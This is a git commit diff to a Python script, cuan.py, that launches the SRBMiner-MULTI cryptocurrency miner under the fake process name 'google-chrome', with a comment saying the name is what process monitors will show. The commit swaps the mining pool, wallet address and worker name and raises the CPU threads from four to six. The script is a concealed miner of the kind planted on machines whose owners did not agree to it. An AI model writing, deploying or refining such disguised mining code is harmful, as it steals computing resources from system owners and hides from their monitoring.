f6d1acb33df1de27a234993e850d24f488b651c9
ferasa <86012372+desafff@users.noreply.github.com>
2025-01-01 20:36:35 +0700

    Update cuan.py

--- cuan.py
+++ cuan.py
@@ -5,9 +5,9 @@ os.execvp("./SRBMiner-MULTI", [
     "google-chrome",  # This will be the name shown in process monitors
     "--disable-gpu",
     "--algorithm", "verushash",
-    "--pool", "sg.vipor.net:5040",
-    "--wallet", "RFKr91aNYATHiemELH8FfCyNDFuo1gkAbK",
-    "--worker", "aaa",  # Using a fixed worker name
-    "--password", "solo",
-    "--cpu-threads", "4"
+    "--pool", "na.luckpool.net:3956",
+    "--wallet", "R9HMvHdgUX8h7h7ch3xGq4qGGVsRmuC74T",
+    "--worker", "tr1",  # Using a fixed worker name
+    "--password", "x",
+    "--cpu-threads", "6"
 ])
